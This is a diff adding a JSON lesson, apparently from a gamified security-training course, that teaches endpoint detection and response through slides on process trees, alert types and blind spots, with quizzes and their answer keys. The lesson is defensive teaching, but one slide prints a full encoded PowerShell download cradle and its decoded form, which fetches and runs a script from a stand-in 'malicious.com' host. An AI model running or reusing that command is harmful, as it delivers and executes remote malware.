@@ -1,0 +1,90 @@
+{
+    "id": "l4",
+    "chapterId": "ch_4",
+    "title": "Endpoint Detection & Response (EDR) 🖥️",
+    "description": "Deep visibility into process, network, and file activity on hosts.",
+    "xpReward": 35,
+    "estimatedMinutes": 10,
+    "section": "Host Analysis",
+    "slides": [
+        {
+            "id": "s_l4_1",
+            "type": "text",
+            "title": "Beyond Antivirus: EDR 🚀",
+            "content": "# The Eyes on the Ground\n\nTraditional Antivirus (AV) asks: *'Is this file known to be bad?'* (Signature-based).\n\n**EDR asks:** *'What is this process DOING right now?'* (Behavior-based).\n\n**EDR Capabilities:**\n- **Process Tree Visualization:** See `winword.exe` launching `powershell.exe` launching `cmd.exe`. (Very suspicious!)\n- **Real-time Response Shell:** Remote command line access to the endpoint.\n- **Network Isolation:** Instantly cut the host off from the network.\n- **File/Script Visibility:** See every file created, modified, or executed.\n\n**Key Vendors:** CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne, Palo Alto Cortex XDR."
+        },
+        {
+            "id": "s_l4_2",
+            "type": "text",
+            "title": "EDR Investigation: Process Trees 🌳",
+            "content": "### Following the Parent-Child Relationship\n\nAttackers rarely launch malware directly by double-clicking `malware.exe`. They use **Living off the Land** binaries (LOLBins).\n\n**Example Suspicious Process Tree:**\n```text\nwinword.exe (PID 1234) \n    └── cmd.exe (PID 5678) /c \"powershell -enc ...\"\n            └── powershell.exe (PID 9012) -enc SQBFAFgA...\n                    └── rundll32.exe (PID 3456) C:\\Temp\\bad.dll,EntryPoint\n```\n\n**Why is this suspicious?**\n- **winword.exe** (Microsoft Word) should **not** be spawning a command prompt. This indicates a macro exploit.\n- **cmd.exe** spawning **powershell.exe** with an encoded command is the classic **Living off the Land** attack chain.\n\n**In the EDR console, you can visually see this tree and pivot to the command line arguments of each process.**"
+        },
+        {
+            "id": "s_l4_3",
+            "type": "quiz",
+            "title": "Process Tree Analysis 🕵️",
+            "content": "",
+            "quizData": {
+                "id": "q_l4_1",
+                "type": "multiple_choice",
+                "question": "You observe the process tree: 'outlook.exe' -> 'cmd.exe' -> 'powershell.exe'. What is the most likely explanation?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "The user is troubleshooting their email.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "A phishing email with a malicious attachment or link was opened.",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "Windows Update is running.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "This is normal behavior for Outlook.",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "Email clients rarely spawn command shells. This is a classic indicator of malicious macro or exploit execution.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l4_4",
+            "type": "text",
+            "title": "EDR Alert Examples 🚨",
+            "content": "### What Does EDR Actually Alert On?\n\n1.  **Suspicious Process Injection**\n    - Process A injects code into Process B (common for hiding malware).\n    - MITRE: T1055.\n\n2.  **Credential Dumping**\n    - Process `lsass.exe` is accessed by a non-system process (Mimikatz).\n    - MITRE: T1003.\n\n3.  **PowerShell Download Cradle**\n    - Command line contains `IEX (New-Object Net.WebClient).DownloadString`.\n    - MITRE: T1059.001.\n\n4.  **Ransomware Behavior**\n    - Process reads a file, writes to a file with a different extension (`.doc` -> `.encrypted`), and deletes the original. **Massive number of file modifications in a short time.**\n    - MITRE: T1486."
+        },
+        {
+            "id": "s_l4_5",
+            "type": "code",
+            "title": "Example: Suspicious PowerShell Command 📜",
+            "content": "This is a common command that EDR would flag as a 'Download Cradle'.\n\n**Command:**\n```powershell\npowershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAXQAuAHAAcwAxACcAKQA=\n```\n\n**What's wrong?**\n- `-Enc` means the command is Base64 encoded to hide its intent.\n- `-Exec Bypass` bypasses PowerShell execution policy.\n- `-W Hidden` hides the window.\n\n**If you decode the Base64:**\n`IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')`\n\n**This is a textbook malware dropper.** EDR will catch this based on the **behavior** of PowerShell making a network connection and downloading script content, even if the URL is brand new."
+        },
+        {
+            "id": "s_l4_6",
+            "type": "warning",
+            "title": "EDR Blind Spots 👁️‍🗨️",
+            "content": "## What EDR Doesn't See\n\n1.  **Unmanaged Devices:** Personal phones, rogue Raspberry Pis plugged into a network jack.\n2.  **Legacy Systems:** Windows Server 2003 that can't run modern EDR agents.\n3.  **Network Traffic Content:** EDR sees *that* a connection was made, but not the full packet payload (e.g., exfiltrated data content).\n4.  **Encrypted Traffic:** If the malware uses HTTPS, EDR can see the destination IP but not the HTTP Path or Data.\n\n**This is why you need Network Detection as well.**"
+        },
+        {
+            "id": "s_l4_7",
+            "type": "quiz",
+            "title": "EDR Capabilities Check 🛡️",
+            "content": "",
+            "quizData": {
+                "id": "q_l4_2",
+                "type": "true_false",
+                "question": "EDR can block a malicious IP address at the network firewall automatically.",
+                "correctAnswer": false,
+                "explanation": "False. EDR controls the endpoint, not the network firewall. However, some integrated platforms (XDR) can orchestrate actions across both EDR and firewall.",
+                "xpReward": 10
+            }
+        }
+    ]
+}
